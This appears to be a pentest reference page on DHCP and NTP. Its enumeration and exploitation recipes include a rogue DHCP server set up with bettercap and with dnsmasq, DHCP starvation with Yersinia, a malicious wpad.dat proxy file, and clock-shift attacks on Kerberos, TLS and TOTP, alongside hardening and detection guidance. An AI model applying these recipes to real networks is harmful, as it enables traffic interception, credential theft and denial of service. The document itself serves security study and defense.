## 1. Overview

DHCP and NTP are foundational network services. DHCP assigns IP
addresses and network configuration to clients; NTP synchronizes time.
Both are frequently misconfigured, both rely on UDP, and both are
powerful vectors for redirection (DHCP) and cryptographic weakening
(NTP).

**Core concepts - DHCP:**

- **Discover / Offer / Request / Acknowledge (DORA)** - the four-step
  lease process.
- **Lease** - IP address assignment with a duration.
- **Options** - additional config (gateway, DNS, domain, NTP, WPAD,
  PXE).
- **DHCPv6** - IPv6 equivalent (uses multicast).
- **PXE boot** - network boot via DHCP options 66/67.
- **WPAD** - Web Proxy Auto-Discovery via DHCP option 252 (legacy,
  insecure).

**Core concepts - NTP:**

- **Stratum** - distance from the reference clock (0 = atomic, 1 =
  primary, 2+ = secondary).
- **NTPv4** - current version, authentication optional.
- **NTS (Network Time Security)** - modern authenticated NTP
  (RFC 8915).
- **NTP pool** - public NTP servers.
- **Modes** - client/server, symmetric, broadcast.

**Ports:**

- 67/UDP - DHCP server.
- 68/UDP - DHCP client.
- 547/UDP - DHCPv6 server.
- 546/UDP - DHCPv6 client.
- 123/UDP - NTP.

**Common software:**

- DHCP: ISC DHCP, Kea, dnsmasq, Windows DHCP.
- NTP: ntpd, chrony, Windows Time (w32time), OpenNTPD.

## 2. Reconnaissance / Enumeration

**Offensive - DHCP enumeration:**

    # nmap scripts
    nmap -sU -p 67 --script dhcp-discover 10.10.10.0/24

    # dhcping (check for a running DHCP server)
    dhcping -s 10.10.10.1

    # Request an address from the server (on Linux)
    sudo dhclient -v eth0
    sudo dhclient -v -s 10.10.10.1 eth0

    # View current lease
    cat /var/lib/dhcp/dhclient.leases
    ip addr show

**Offensive - DHCP options discovery:**

    # Use a custom client (e.g. dhcping with options, or scapy)
    # Common options:
    # 1   - Subnet Mask
    # 3   - Router (default gateway)
    # 6   - DNS Servers
    # 15  - Domain Name
    # 42  - NTP Servers
    # 44  - NetBIOS Name Servers
    # 46  - NetBIOS Node Type
    # 66  - TFTP Server Name (PXE)
    # 67  - Bootfile Name (PXE)
    # 119 - Domain Search List
    # 121 - Classless Static Route
    # 252 - WPAD (Web Proxy Auto-Discovery)

    # Expected output from a real network:
    # option 3 (router): 10.10.10.1
    # option 6 (dns): 10.10.10.1, 8.8.8.8
    # option 15 (domain): corp.local
    # option 42 (ntp): 10.10.10.1
    # option 252 (wpad): http://wpad.corp.local/wpad.dat

**Offensive - NTP enumeration:**

    # nmap scripts
    nmap -sU -p 123 --script ntp-info 10.10.10.1
    nmap -sU -p 123 --script ntp-monlist 10.10.10.1

    # ntpq (query a remote NTP server)
    ntpq -p 10.10.10.1
    ntpq -c rv 10.10.10.1
    ntpq -c "readvar" 10.10.10.1

    # Expected output:
    # associd=0 status=0615 leap_none, sync_ntp, 1 event, clock_sync,
    # version="ntpd 4.2.8p13@1.3847-o ..."
    # processor="x86_64", system="Linux/5.4.0", ...
    # leap=00, stratum=3, precision=-23, ...
    # (Version disclosure, stratum, upstream servers.)

**Offensive - NTP monlist (amplification check):**

    # Check if the server supports monlist (NTP mode 6)
    ntpdc -c monlist 10.10.10.1
    # Or with nmap:
    nmap -sU -p 123 --script ntp-monlist 10.10.10.1

    # Expected output (if vulnerable):
    # monlist: 600 entries (amplification factor ~200x)

**Offensive - NTP authentication check:**

    # Check if NTP is authenticated
    ntpq -c "readvar" 10.10.10.1 | grep -i auth

    # No auth = vulnerable to spoofing.

**Defensive - what to baseline:**

- DHCP server configuration (options, lease duration, reservations).
- Authorized DHCP servers (via DHCP snooping).
- NTP server version and upstreams.
- NTP authentication / NTS status.
- Monlist / mode 6 query support.

## 3. Common Attack Vectors

**DHCP attacks:**

- **Rogue DHCP server** - attacker runs a DHCP server on the network;
  clients get attacker's gateway/DNS.
- **DHCP starvation** - attacker exhausts the DHCP pool, then runs a
  rogue server.
- **DHCP spoofing** - on-path attacker modifies DHCP responses.
- **WPAD hijacking** - attacker serves a malicious `wpad.dat` via
  DHCP option 252.
- **PXE hijacking** - attacker serves a malicious boot image via
  DHCP options 66/67.

**NTP attacks:**

- **NTP amplification** - mode 6 monlist query with spoofed source;
  amplification factor up to 200x.
- **NTP spoofing** - on-path attacker modifies NTP responses;
  shifts victim's clock.
- **Time-based attacks** - shift clock to bypass certificate
  validation, Kerberos (Skewed tickets), TOTP (2FA), token expiry.
- **NTP DoS** - flood NTP server with mode 6 queries.

**Combined:**

- **DHCP + NTP attack** - rogue DHCP server points clients to
  attacker's NTP server; attacker shifts clock.
- **DHCP + DNS attack** - rogue DHCP server points clients to
  attacker's DNS; attacker redirects traffic.

## 4. Exploitation Recipes

**Rogue DHCP server with bettercap:**

    # 1. On the attacker (same L2 segment):
    bettercap -iface eth0
    > set dhcp6.server true
    > set dhcp.server true
    > set dhcp.router 10.10.10.99
    > set dhcp.dns 10.10.10.99
    > set dhcp.domain corp.local
    > set dhcp.wpad http://10.10.10.99/wpad.dat
    > dhcp on

    # 2. New clients get attacker's gateway/DNS/WPAD.

**Rogue DHCP server with dnsmasq:**

    # 1. Install dnsmasq
    apt install dnsmasq

    # 2. Configure
    cat > /etc/dnsmasq.conf <<'EOF'
    interface=eth0
    dhcp-range=10.10.10.100,10.10.10.200,12h
    dhcp-option=3,10.10.10.99     # gateway
    dhcp-option=6,10.10.10.99     # DNS
    dhcp-option=42,10.10.10.99    # NTP
    dhcp-option=252,"\n"          # WPAD (empty = disable)
    EOF

    # 3. Start dnsmasq
    systemctl start dnsmasq

    # 4. New clients get the attacker's gateway/DNS/NTP.

**DHCP starvation with Yersinia:**

    # 1. Yersinia (GUI or CLI)
    yersinia -I

    # 2. Choose DHCP mode, start starvation.
    # 3. All available IPs in the pool are consumed.
    # 4. Clients can no longer get a lease.
    # 5. Attacker runs a rogue DHCP server.

**WPAD hijacking:**

    # 1. Rogue DHCP server serves option 252:
    #    http://10.10.10.99/wpad.dat
    # 2. Clients request the file.
    # 3. Attacker serves:
    cat > /var/www/html/wpad.dat <<'EOF'
    function FindProxyForURL(url, host) {
        if (shExpMatch(host, "*.corp.local")) {
            return "PROXY 10.10.10.99:8080";
        }
        return "DIRECT";
    }
    EOF
    # 4. All HTTP traffic to *.corp.local goes through the attacker's
    #    proxy.

**NTP monlist amplification check:**

    # 1. Check if monlist is enabled
    ntpdc -c monlist 10.10.10.1

    # 2. If yes, the server can be abused for amplification.
    # 3. Attack (spoofed source):
    #    (Use a tool like ntp-amplification or a custom scapy script.)

**NTP spoofing with a fake server:**

    # 1. Set up a fake NTP server on the attacker (chrony with a local
    #    reference or a custom script).
    # 2. Rogue DHCP server points clients to the attacker's NTP.
    # 3. Attacker shifts the clock.

    # Example: shift clock by 1 hour
    # (Requires a custom NTP server; chrony does not allow arbitrary
    # time shifts.)

**Time shift -> Kerberos ticket reuse:**

    # 1. Shift the victim's clock back 1 hour.
    # 2. Expired Kerberos tickets (within the skew window) become valid.
    # 3. Reuse tickets that were supposed to be expired.
    # (Requires an already-captured ticket.)

**Time shift -> certificate validation bypass:**

    # 1. Shift the victim's clock back to a period when a certificate
    #    was still valid.
    # 2. Present an expired certificate; it validates.
    # (Requires an on-path position.)

**Time shift -> TOTP bypass:**

    # 1. TOTP (2FA) codes are time-based (30-second windows).
    # 2. Shift the victim's clock; old codes become valid again.
    # 3. Replay a previously captured code.

## 5. Post-Exploitation

**After a rogue DHCP server:**

- Intercept all client traffic (with a proxy).
- Redirect DNS queries to attacker-controlled DNS.
- Serve a malicious WPAD file.
- Serve a malicious PXE boot image.
- Harvest credentials from intercepted HTTP traffic.

**After NTP spoofing:**

- Reuse expired Kerberos tickets.
- Bypass certificate validation.
- Replay old TOTP codes.
- Bypass token expiry.

**Cleanup (blue team):**

- Enable DHCP snooping on switches.
- Configure trusted DHCP server ports.
- Enable NTP authentication (symmetric keys) or NTS.
- Disable monlist / mode 6 queries.
- Monitor for rogue DHCP servers.

## 6. Risk Context

DHCP and NTP are critical but often ignored:

- A rogue DHCP server can redirect an entire subnet.
- WPAD hijacking can intercept all HTTP traffic.
- NTP amplification is a common DDoS vector.
- NTP spoofing can weaken every time-based security control.

**Blast radius:** rogue DHCP affects every client on the subnet; NTP
spoofing affects every time-dependent protocol (Kerberos, TLS, TOTP).

**Why attacks succeed:**

- DHCP has no authentication.
- DHCP snooping is rarely enabled.
- WPAD is still enabled on Windows by default.
- NTP authentication is rarely deployed.
- Monlist is still enabled on old NTP servers.
- Time-based security controls assume an accurate clock.

## 7. Root Causes

- **DHCP has no built-in authentication.**
- **DHCP snooping not enabled** on switches.
- **WPAD enabled by default** on Windows.
- **PXE boot enabled** without authentication.
- **NTP unauthenticated** (symmetric keys or NTS not deployed).
- **Monlist enabled** on old NTP servers.
- **Time-based controls assumed accurate.**

## 8. Preventive Controls

**DHCP hardening:**

- Enable DHCP snooping on all access switches.
- Configure trusted ports (only uplinks to the real DHCP server).
- Disable WPAD via Group Policy (Windows) or DNS blackhole.
- Disable PXE boot where not needed.
- Use DHCP options 82 (relay agent information) for traceability.

**NTP hardening:**

- Deploy NTS (Network Time Security) where possible.
- Use symmetric key authentication (weaker than NTS but better than
  nothing).
- Disable monlist (`disable monitor` in ntp.conf).
- Restrict mode 6 queries.
- Use a small set of trusted upstream servers.
- Monitor for time shifts.

**Monitoring:**

- DHCP snooping logs.
- Alert on new DHCP servers (rogue detection).
- NTP logs.
- Alert on time shifts (sudden jumps, drift).

## 9. Detection Controls

**Rogue DHCP server:**

- DHCP snooping on switches.
- Alert on DHCP offers from untrusted ports.
- Network-based detection (DHCP monitor tools).

**DHCP starvation:**

- Alert on high volume of DHCP DISCOVER packets from a single MAC.
- DHCP snooping rate limiting.

**WPAD hijacking:**

- Monitor for option 252 in DHCP responses.
- Alert on unexpected `wpad.dat` servers.

**NTP amplification:**

- NetFlow: high volume of NTP responses to a single source.
- Alert on mode 6 monlist queries.

**NTP spoofing:**

- NTP authentication failures (if keys are configured).
- Alert on large time shifts (monitor via NTP logs).

**Time-based attack detection:**

- Kerberos: alert on tickets outside normal time windows.
- TLS: alert on certificates outside validity periods.
- TOTP: alert on repeated code use.

**General:**

- Forward DHCP and NTP logs to a SIEM.
- Baseline normal patterns; alert on anomalies.

## 10. Verification

**Offensive - did the attack succeed?**

- Rogue DHCP: a new client gets the attacker's gateway/DNS.
- WPAD hijacking: `wpad.dat` served; HTTP traffic goes through the
  attacker.
- DHCP starvation: legitimate clients cannot get a lease.
- NTP amplification: server responds to monlist with a large payload.
- NTP spoofing: client's clock shifts to the attacker-controlled time.
- Time shift: expired Kerberos ticket accepted.

**Defensive - are controls effective?**

- Test rogue DHCP: DHCP snooping blocks unauthorized offers.
- Test WPAD: option 252 not present or points to a legitimate server.
- Test NTP: authentication is enabled; monlist is disabled.
- Test time shift: alert fires on large clock jumps.
- Test time-based controls: they tolerate small skew but not large.

## 11. OSCP Notes

- DHCP and NTP are rarely OSCP targets, but appear in internal
  network labs.
- Practice: DHCP option enumeration, NTP version/stratum disclosure.
- **Capture screenshots** of:
  - DHCP option enumeration.
  - NTP `ntpq -c rv` output.
- The `> [!IMPORTANT]` OSCP reporting note applies to any network
  service enumeration.

## 12. Production Notes

- Rogue DHCP is a common attack in unmanaged networks; DHCP snooping
  is the standard defense.
- WPAD is a legacy feature; disable it wherever possible.
- NTP amplification is a common DDoS vector; disable monlist.
- NTP authentication (NTS or symmetric keys) is rarely deployed but
  recommended.
- Monitor time shifts; they are a sign of NTP attacks or misconfig.

## 13. References

**RFCs and documentation:**

- [RFC 2131 - Dynamic Host Configuration Protocol](https://www.rfc-editor.org/rfc/rfc2131)
- [RFC 8415 - DHCPv6](https://www.rfc-editor.org/rfc/rfc8415)
- [RFC 5905 - NTPv4](https://www.rfc-editor.org/rfc/rfc5905)
- [RFC 8915 - Network Time Security](https://www.rfc-editor.org/rfc/rfc8915)
- [ISC DHCP documentation](https://kb.isc.org/docs/isc-dhcp-44-manual-pages)
- [chrony documentation](https://chrony.tuxfamily.org/documentation.html)

**MITRE ATT&CK:**

- [Discovery - System Network Configuration Discovery (T1016)](https://attack.mitre.org/techniques/T1016/)
- [Collection - Adversary-in-the-Middle (T1557)](https://attack.mitre.org/techniques/T1557/)
- [Impact - Network Denial of Service (T1498)](https://attack.mitre.org/techniques/T1498/)
- [Credential Access - Forced Authentication (T1187)](https://attack.mitre.org/techniques/T1187/)

**Tools:**

- [Yersinia](https://github.com/tomac/yersinia)
- [bettercap](https://github.com/bettercap/bettercap)
- [dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html)
- [ntpq](https://linux.die.net/man/8/ntpq) / [ntpdc](https://linux.die.net/man/8/ntpdc)
- [chrony](https://chrony.tuxfamily.org/)

**Research:**

- [HackTricks - DHCP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dhcp)
- [HackTricks - NTP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp)
- [US-CERT - NTP Amplification](https://www.cisa.gov/news-events/alerts/2014/01/13/ntp-amplification-attacks)